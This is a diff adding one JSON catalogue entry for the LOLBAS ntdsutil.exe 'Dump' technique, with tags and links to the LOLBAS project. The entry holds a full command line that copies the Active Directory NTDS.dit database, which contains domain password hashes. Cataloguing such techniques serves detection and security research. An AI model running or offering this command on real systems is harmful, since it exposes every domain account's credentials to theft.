@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-ntdsutil-exe-dump",
+  "name": "LOLBAS · ntdsutil.exe (Dump)",
+  "command": "ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full c:\\\" q q",
+  "description": "Dump NTDS.dit into folder",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "ntdsutil",
+    "dump"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/ntdsutil/",
+  "upstream_id": "ntdsutil.exe/Dump/0",
+  "category": "lolbas",
+  "subcategory": "dump",
+  "references": [
+    {
+      "title": "LOLBAS — ntdsutil.exe",
+      "url": "https://lolbas-project.github.io/lolbas/ntdsutil/"
+    }
+  ]
+}
